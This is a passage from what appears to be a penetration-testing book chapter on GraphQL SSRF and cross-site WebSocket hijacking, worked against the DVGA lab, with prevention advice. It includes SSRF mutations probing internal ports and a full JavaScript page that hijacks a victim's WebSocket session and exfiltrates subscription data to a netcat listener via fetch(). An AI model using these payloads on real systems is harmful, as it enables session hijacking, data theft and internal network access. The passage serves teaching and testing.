<p class="BodyFirst">You might encounter three kinds of SSRF vulnerability when performing a GraphQL penetration test. Much like the blind SQL injection you learned about in <span class="xref" itemid="xref_target_Chapter 8">Chapter 8</span>, <em>blind SSRF</em> vulnerabilities provide no concrete visual indication that the vulnerability exists. Instead, an attacker may be able to infer the presence of a vulnerability by using out-of-band exploitation tools that can listen to various protocol messages.</p>
<p>For example, recall the URL image-fetching service we discussed earlier. When exploiting a blind SSRF, an attacker may be able to tell that the application is vulnerable by capturing traffic on the remote server that hosts <em>lab.blackhatgraphql.com</em>. When the attacker submits the URL <em>http://lab.blackhatgraphql.com/cat.png</em>, the application may initiate certain connections on different protocols before it attempts to perform the image fetch over HTTP, such as TCP connections on port 80. This could indicate that the application is attempting to reach the attacker-controlled server.</p>
<p>Another way to determine the existence of a blind SSRF is through timing analysis. An attacker can introduce an intentional, artificial delay in the HTTP responses that the attacker-controlled server returns, and then determine whether the attack succeeded based on the amount of time it takes for the vulnerable application to return a response.</p>
<p><span epub:type="pagebreak" id="Page_236" title="236"/>As the name implies, a <em>semi-blind SSRF</em> offers some evidence, but not a full indication, that an SSRF vulnerability exists. The information could include errors or partial server responses. Imagine that an attacker tries submitting various internal URLs to the image-fetching service in an attempt to discover which network the host is on. For example, they might submit <em>http://10.10.0.254/index.html</em> or <em>http://172.12.0.254/index.html</em>. In a successful attempt, the application may send an email without the attachment, while for a failed attempt, it wouldn’t send an email at all.</p>
<p>The last type of SSRF is the kind you should hope to discover as a penetration tester: <em>non-blind SSRF</em> (also called <em>full-read SSRF</em>), in which the server returns a full response to the attacker, indicating that the SSRF vulnerability exists. In the example of the image-fetching service, we may see the full HTTP response after providing a non-image-based URL to the application.</p>
<h3 id="h2-502840c09-0009"><a class="XrefDestination" id="SearchingforVulnerableOperations,Fields,andArguments"/><span class="XrefDestination" id="xref-502840c09-015"/>Searching for Vulnerable Operations, Fields, and Arguments</h3>
<p class="BodyFirst">When testing GraphQL servers for SSRF, examine all possible operations, whether they’re mutations or queries. As you might expect, SSRF typically affects one or more vulnerable GraphQL arguments that accept values, such as scalars.</p>
<p>Also pay close attention to GraphQL field names to see what they were designed to do. For example, fields whose names include verbs such as <em>fetch</em>, <em>import</em>, <em>download</em>, or <em>read</em> could all imply that the server performs an action, such as reading from somewhere or fetching a resource. In addition to field names, certain argument names could suggest that the server is attempting to perform an outbound connection to resolve the query. Here are a few examples:</p>
<ol class="none">
<li><code>ip</code></li>
<li><code>url</code></li>
<li><code>host</code></li>
<li><code>network</code></li>
<li><code>domain</code></li>
<li><code>site</code></li>
<li><code>target</code></li>
<li><code>fetch</code></li>
<li><code>img_url</code></li>
<li><code>target_url</code></li>
<li><code>remote_url</code></li>
</ol>
<p>This is a partial list, but it should give you an idea of which keywords could be telling.</p>
<h3 id="h2-502840c09-0010"><a class="XrefDestination" id="TestingforSSRF"/><span class="XrefDestination" id="xref-502840c09-016"/>Testing for SSRF</h3>
<p class="BodyFirst">Let’s go ahead and test for SSRF vulnerabilities in DVGA by using Burp Suite. Open the built-in browser by clicking <b>Open Browser</b>. Then, quickly <span epub:type="pagebreak" id="Page_237" title="237"/>tour DVGA’s web interface. Does anything jump out at you? How about the Import a Paste page, shown in <a href="#figure9-6" id="figureanchor9-6">Figure 9-6</a>?</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c09/F09006.png"/>
<figcaption><p><a id="figure9-6">Figure 9-6</a>: DVGA’s Import a Paste page</p></figcaption>
</figure>
<p>The Import from URL form takes a URL and attempts to import the paste from it. To see what happens when you submit a URL, toggle on the Intercept mode in Burp Suite, enter any URL into the search bar, and click <b>Submit</b>. (Here is an example paste you could import: <em>https://pastebin.com/raw/LQ6u1qyi</em>.) You should see a request like the following in Burp:</p>
<pre><code>POST /graphql HTTP/1.1
Host: localhost:5013
Content-Length: 302
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
<var>--snip--</var>
Origin: http://localhost:5013
Referer: http://localhost:5013/import_paste
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: env=graphiql:disable
Connection: close

{"query":"mutation ImportPaste ($host: String!, $port: Int!, $path: String!,
$scheme: String!) {\n        importPaste(<b>host:</b> $host, <b>port:</b> $port, <b>path:</b> $path,
<b>scheme:</b> $scheme) {\n          result\n        }\n }","variables":{"host":"pastebin.com","port":443,"path":"/raw/LQ6u1qyi",
"scheme":"https"}}</code></pre>
<p><span epub:type="pagebreak" id="Page_238" title="238"/>As you can see, the request uses the <code>importPaste</code> mutation, which accepts four arguments: <code>host</code>, <code>port</code>, <code>path</code>, and <code>scheme</code>. The POST JSON payload includes the <code>variables</code> key to pass the URL components (values) to these arguments.</p>
<p>Behind the scenes, DVGA uses the URL as part of an HTTP GET request, reads the response, and adds it into its paste database. To see the imported content, click the <b>Forward</b> button in Burp Suite to send the request to the GraphQL server, toggle off Intercept mode, and go to the <b>Private Pastes</b> page.</p>
<p>Under the hood, GraphQL made an HTTP call to retrieve this content from the URL. This type of functionality screams SSRF! Let’s manually explore the same GraphQL query, changing some of the values. The mutation is shown in <a href="#listing9-7" id="listinganchor9-7">Listing 9-7</a>.</p>
<pre><code>mutation {
  importPaste(scheme: "https", host:"pastebin.com", port:443, path:"/raw/LQ6u1qyi") {
    result
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing9-7">Listing 9-7</a>: The <code>importPaste</code> mutation</p>
<p>If you look closely, the four arguments compose the building blocks of a URL that GraphQL will construct (in this case, <em>https://pastebin.com:443/raw/LQ6u1qyi</em>). If we can use the HTTP (or HTTPS) scheme and provide any domain and port that we desire, nothing stops us from poking around for other services on DVGA’s network, right?</p>
<p>Let’s see what happens when we specify an internal URL instead of an external one. In <a href="#listing9-8" id="listinganchor9-8">Listing 9-8</a>, we specify a different URL destination to import a paste from. The mutation will force DVGA to import a paste by making an HTTP request to <em>http://localhost:8080/paste.txt</em>. Note that while <code>localhost</code> is a valid host, port <code>8080</code> is not open on the DVGA container. Therefore, this request won’t return anything meaningful.</p>
<pre><code>mutation {
  importPaste(scheme: "http", host:"localhost", port:8080, path:"/paste.txt") {
    result
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing9-8">Listing 9-8</a>: The malicious version of the <code>importPaste</code> mutation</p>
<p>After running the mutation, you should see this response from Altair:</p>
<pre><code>{
  "data": {
    "importPaste": {
      "result": ""
    }
  }
}</code></pre>
<p><span epub:type="pagebreak" id="Page_239" title="239"/>The server returns an empty <code>result</code> object value. We were able to get this response in Altair pretty quickly. (In our lab, we received it within 100 milliseconds.) So, we now know that we get an immediate result without any data in the <code>result</code> JSON key if we probe a port that isn’t open.</p>
<p>Next, let’s simulate an SSRF vulnerability by probing for a service that does exist. To simulate an additional service on the DVGA container, we’ll use Netcat. First, start a Netcat listener in the DVGA container by running the following Docker command in Kali’s terminal:</p>
<pre><code># <b>sudo docker exec -it dvga nc -lvp 7773</b>

listening on [::]:7773 ...</code></pre>
<p>Next, we’ll construct a payload to send an HTTP probe to the port Netcat is binding to (7773), as shown in <a href="#listing9-9" id="listinganchor9-9">Listing 9-9</a>.</p>
<pre><code>mutation {
  importPaste(scheme: "http", host:"localhost", port:7773, path: "/ssrf") {
    result
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing9-9">Listing 9-9</a>: A mutation query to abuse an SSRF vulnerability</p>
<p>If you send this query, you should receive output similar to <a href="#listing9-10" id="listinganchor9-10">Listing 9-10</a> in your Netcat listener.</p>
<pre><code>connect to [::ffff:127.0.0.1]:7773 from localhost:55554 ([::ffff:127.0.0.1]:55554)
GET /ssrf HTTP/1.1
Host: localhost:7773
User-Agent: curl/7.83.1
Accept: */*</code></pre>
<p class="CodeListingCaption"><a id="listing9-10">Listing 9-10</a>: DVGA request reached the internal service</p>
<p>This shows that DVGA made a GET request to an internal, unexposed port. Note that this port is not directly accessible by the Kali machine; we’re using DVGA itself to reach it, illustrating how an SSRF vulnerability can give an attacker access to services they otherwise wouldn’t be able to reach directly. This SSRF attack is more specifically a <em>cross-site port attack (XSPA)</em>, which falls under the SSRF vulnerability category.</p>
<p>You may have also noticed that Altair hangs after sending the <code>importPaste</code> mutation in <a href="#listing9-10">Listing 9-10</a>. This happens because the Netcat listener we opened won’t return a response, but Altair waits until it receives a response from the GraphQL API. This is effectively a blind SSRF, because we have no direct access to the response as the attacker; all we know is that the client hangs when we probe a port that’s open. You can close the Netcat listener by pressing CTRL-C. Altair’s state should then return to normal.</p>
<h3 id="h2-502840c09-0011"><span epub:type="pagebreak" id="Page_240" title="240"/><a class="XrefDestination" id="PreventingSSRF"/><span class="XrefDestination" id="xref-502840c09-017"/>Preventing SSRF</h3>
<p class="BodyFirst">To determine whether an application might be vulnerable to SSRF, we can ask ourselves this question: Does a client have control over any of the target URLs the API flows use? SSRF mostly involves manipulating target URLs by directing them to unexpected and restricted internal or external locations. Here are some strategies for protecting against this:</p>
<ul class="disc">
<li><b>Input validation. </b>Allows rejecting dangerous characters passed to GraphQL arguments that accept URLs as part of a query or mutation. Ensures that only authorized URLs are accepted and helps reduce the risk of SSRF.</li>
<li><b>Network segmentation.</b> Helps minimize the risk by ensuring that applications can communicate with only the relevant internal networks. A vulnerable GraphQL API in your staging network shouldn’t be able to reach another GraphQL API in your production network.</li>
<li><b>Threat modeling.</b> Allows identifying potential risks earlier in the development life cycle of GraphQL APIs and, more specifically, in queries or mutations that have the potential to be vulnerable to SSRF.</li>
<li><b>Least privileges principle. </b>Helps minimize the blast radius. Ensure that the instance on which GraphQL runs does not have overly permissive permissions and cannot perform privileged actions across applications.</li>
</ul>
<p>In the next section, we’ll pivot to talking about hijacking-based vulnerabilities that impact GraphQL subscriptions.</p>
<h2 id="h1-502840c09-0003"><a class="XrefDestination" id="Cross-SiteWebSocketHijacking"/><span class="XrefDestination" id="xref-502840c09-018"/>Cross-Site WebSocket Hijacking</h2>
<p class="BodyFirst">If an attacker can hijack a user’s session by getting their hands on session cookies that grant special privileges on an application, they can perform actions using the victim’s privileges and access their sensitive data. <em>CSWSH</em> is a CSRF vulnerability that impacts the handshake part of WebSocket communications, which use cookie-based authentication. Because GraphQL APIs can use WebSocket for subscription operations, they risk being vulnerable to CSWSH.</p>
<p>In <span class="xref" itemid="xref_target_Chapter 3">Chapter 3</span>, we showed the handshake request and response sent between a GraphQL client and server when using subscriptions over WebSocket to communicate. Clients initiate these WebSocket handshakes over HTTP and may include a cookie like the following if the WebSocket server implements authentication:</p>
<pre><code>Cookie: session=somesessionID</code></pre>
<p>CSWSH can occur when a WebSocket connection handshake doesn’t include an anti-CSRF token to prevent attackers from performing cross-origin requests. When no such token exists, it’s easy for an attacker to <span epub:type="pagebreak" id="Page_241" title="241"/>develop special code that forges WebSocket messages on behalf of the victim and uses their authenticated session.</p>
<p>In addition to anti-CSRF tokens, WebSocket servers should also validate the <code>Origin</code> header in the WebSocket handshake request. The <code>Origin</code> header has an important security function, as it identifies the request’s source. If a server doesn’t check this header, it won’t know whether the handshake request was forged. Any handshake with an unauthorized origin should return a <em>403 Forbidden</em> response code rather than <em>101 Switching Protocols</em>.</p>
<h3 id="h2-502840c09-0012"><a class="XrefDestination" id="FindingSubscriptionOperations"/><span class="XrefDestination" id="xref-502840c09-019"/>Finding Subscription Operations</h3>
<p class="BodyFirst">CSWSH vulnerabilities lie at the transport protocol level and so aren’t flaws in GraphQL itself. In the context of GraphQL, you’ll find them only when a GraphQL API uses subscriptions to perform real-time updates. Thus, to test for CSWSH, we’ll first want to know whether the target application has any subscription-related fields. To discover this, we can use an introspection query that relies on the <code>subscriptionType</code> to get field names, as shown in <a href="#listing9-11" id="listinganchor9-11">Listing 9-11</a>.</p>
<pre><code>query {
  __schema {
    subscriptionType {
      fields {
        name
      }
    }
  }
}</code></pre>
<p class="CodeListingCaption"><a id="listing9-11">Listing 9-11</a>: Getting subscription field names by using introspection</p>
<p>If you run this query in Altair against DVGA, you should notice a field in the schema named <code>paste</code> that the subscription operation can use.</p>
<h3 id="h2-502840c09-0013"><a class="XrefDestination" id="HijackingaSubscriptionQuery"/><span class="XrefDestination" id="xref-502840c09-020"/>Hijacking a Subscription Query</h3>
<p class="BodyFirst">Now let’s hijack a subscription query and exfiltrate its response. To simulate this attack, we’ll take the following steps. From the attacker’s perspective, we’ll open a Netcat TCP listener on port 4444, where we’ll receive the exfiltrated response. Next, from the victim’s perspective, we’ll simulate a user falling victim to a social-engineering attack by dropping an HTML file into the browser so it loads the JavaScript code, hijacking the user’s session to perform a WebSocket handshake and subscribe to the <code>paste</code> event. We’ll also create a new paste in DVGA for the subscription query to pick up. This will simulate website activity that the victim may have access to that the attacker shouldn’t. Finally, we’ll read the exfiltrated response obtained by Netcat.</p>
<p>Let’s start by first examining the underlying code to understand the attack pattern. Save the CSWSH hijacking code at <a class="LinkURL" href="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/websockets_hijack.html">https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/websockets_hijack.html</a> to your desktop. Make sure the filename has the <em>.html</em> extension. <a href="#listing9-12" id="listinganchor9-12">Listing 9-12</a> shows the code.</p>
<pre><code><span epub:type="pagebreak" id="Page_242" title="242"/>&lt;html&gt;
  &lt;h2&gt;WebSockets Hijacking and GraphQL Subscription Response Exfiltration Demo&lt;/h2&gt;
&lt;/html&gt;

&lt;script&gt;
    const GQL = {
      CONNECTION_INIT: 'connection_init',
      CONNECTION_ACK: 'connection_ack',
      CONNECTION_ERROR: 'connection_error',
      CONNECTION_KEEP_ALIVE: 'ka',
      START: 'start',
      STOP: 'stop',
      CONNECTION_TERMINATE: 'connection_terminate',
      DATA: 'data',
      ERROR: 'error',
      COMPLETE: 'complete'
    }

  ws = new WebSocket('ws://localhost:5013/subscriptions'); <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>
  ws.onopen = function start(event) {
        var query = 'subscription getPaste {paste { id title content
ipAddr userAgent public owner {name} } }'; <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>

        var graphqlMsg = {
             type: GQL.START,
             payload: {query}
        };
        ws.send(JSON.stringify(graphqlMsg)); <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>
  }
  ws.onmessage = function handleReply(event) {
    data = JSON.parse(event.data) <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>
    fetch('http://localhost:4444/?'+ JSON.stringify(data), {mode: 'no-cors'}); <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>
  }
&lt;/script&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing9-12">Listing 9-12</a>: JavaScript code that performs WebSocket hijacking</p>
<p>We initialize a new <code>WebSocket</code> object and specify the DVGA’s subscription URL <span aria-label="annotation1" class="CodeAnnotation">❶</span>. At <span aria-label="annotation2" class="CodeAnnotation">❷</span>, we declare a <code>query</code> variable containing the subscription query. This query subscribes to the <code>paste</code> event and fetches fields such as <code>id</code>, <code>title</code>, <code>content</code>, <code>ipAddr</code>, <code>userAgent</code>, <code>public</code>, and the owner’s <code>name</code>. At <span aria-label="annotation3" class="CodeAnnotation">❸</span>, we send a JSON string containing this query over the WebSocket protocol. After the message is sent, the <code>ws.onmessage</code> event handler is called when incoming WebSocket messages are received. This handler will parse the message as a JSON object <span aria-label="annotation4" class="CodeAnnotation">❹</span>. Once the message is parsed, the code at <span aria-label="annotation5" class="CodeAnnotation">❺</span> will exfiltrate the response to a destination (in this case, <em>http://localhost:4444</em>) by using GET URL parameters.</p>
<p>Let’s get things started! In a terminal window, run the following command to start the Netcat listener:</p>
<pre><code># <b>nc -vlp 4444</b>

listening on [any] 4444 ...</code></pre>
<p><span epub:type="pagebreak" id="Page_243" title="243"/>The <code>-vlp</code> flags we pass to Netcat tell it to listen (<code>-l</code>) in verbose mode (<code>-v</code>) on port (<code>-p</code>) 4444. Next, open a browser window and drop the HTML file you downloaded earlier into the browser’s window. You should see the page shown in <a href="#figure9-7" id="figureanchor9-7">Figure 9-7</a>.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c09/F09007.png"/>
<figcaption><p><a id="figure9-7">Figure 9-7</a>: The WebSocket hijacking demo</p></figcaption>
</figure>
<p>Next, open another browser window and click <b>Create Paste</b> on the left to open the Create a Paste page on <em>http://localhost:5013</em>. Enter something you’ll recognize as the title and your message, as shown in <a href="#figure9-8" id="figureanchor9-8">Figure 9-8</a>.</p>
<figure>
<img alt="" class="keyline" src="image_fi/502840c09/F09008.png"/>
<figcaption><p><a id="figure9-8">Figure 9-8</a>: A paste creation in DVGA</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_244" title="244"/>Next, click <b>Submit</b>, and pay close attention the terminal window in which Netcat is running. You should see output similar to this:</p>
<pre><code>listening on [any] 4444 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 50198
GET /?<b>{%22type%22:%22data%22,%22payload%22:{%22data%22:{%22paste%22:{%22id%22:</b>
<b>%2214%22,%22title%22:%22This%20will%20get%20exfiltrated!%22,%22content%22:%22</b>
<b>Exiltrated%20Data%22,%22ipAddr%22:%22172.17.0.1%22,%22userAgent%22:%22</b>
<b>Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537</b>
<b>.36%20(KHTML,%20like%20Gecko)%20Chrome/96.0.4664.45%20Safari/537.36%22,</b>
<b>%22public%22:true,%22owner%22:{%22name%22:%22DVGAUser%22}}}}} </b>HTTP/1.1
Host: localhost:4444
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: "Linux"
Accept: */*
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close</code></pre>
<p>Netcat received a GET request from the victim containing the exfiltrated paste data. You can see that the request’s URL parameters start with <code>/?{%22type</code>. The payload is URL encoded, but when you decode it, you can immediately tell it’s the paste data we created using DVGA’s user interface. You can perform this URL decoding with a website such as <a class="LinkURL" href="https://meyerweb.com/eric/tools/dencoder">https://meyerweb.com/eric/tools/dencoder</a> or by using Python from the terminal, as shown in <a href="#listing9-13" id="listinganchor9-13">Listing 9-13</a>.</p>
<pre><code># <b>echo </b><var class="bold">'ADD-STRING-HERE'</var><b> | python3 -c "import sys;</b>
<b>from urllib.parse import unquote; print(unquote(sys.stdin.read()));"</b></code></pre>
<p class="CodeListingCaption"><a id="listing9-13">Listing 9-13</a>: URL decoding with Python</p>
<p>We were able to exfiltrate data by forcing a client to visit an attacker-controlled website, where custom code sent forged, cross-site WebSocket messages and exfiltrated their responses to a remote Netcat listener.</p>
<h3 id="h2-502840c09-0014"><a class="XrefDestination" id="PreventingCSWSH"/><span class="XrefDestination" id="xref-502840c09-021"/>Preventing CSWSH</h3>
<p class="BodyFirst">Because CSWSH is a CSRF attack, you can prevent it by using CSRF mitigation techniques. WebSocket servers that use forms of authentication other than cookies to authenticate clients, such as JWT, can also offer protections. When a server uses JWT tokens, cross-site WebSocket messages won’t be able to authenticate without the proper headers, resulting in a handshake failure.</p>
<p>Validation of the <code>Origin</code> header is also crucial to preventing CSWSH attacks, and from a hacker’s perspective, this validation is worth testing for <span epub:type="pagebreak" id="Page_245" title="245"/>bypasses. Servers may check the header in odd ways. For instance, if the application allows only the origin <em>example.com</em>, an attacker might try creating a domain that uses it as its subdomain, like <em>example.com.attacker.net</em>. If the server validates the <code>Origin</code> header in a naive way (for instance, by checking for the string <em>example.com</em>), such an attack might pass the validation logic.</p>
<h2 id="h1-502840c09-0004"><a class="XrefDestination" id="Summary"/><span class="XrefDestination" id="xref-502840c09-022"/>Summary</h2>
<p class="BodyFirst">In this chapter, you learned about attacks affecting GraphQL API consumers and servers. Using GET- and POST-based CSRF, attackers could forge queries and mutations on behalf of clients. By hijacking WebSocket communications by using CSWSH, an attacker could exfiltrate GraphQL subscription responses. Finally, SSRF allows attackers to forge requests on behalf of servers and potentially reach internal resources.</p>
</section>
</body>
</html>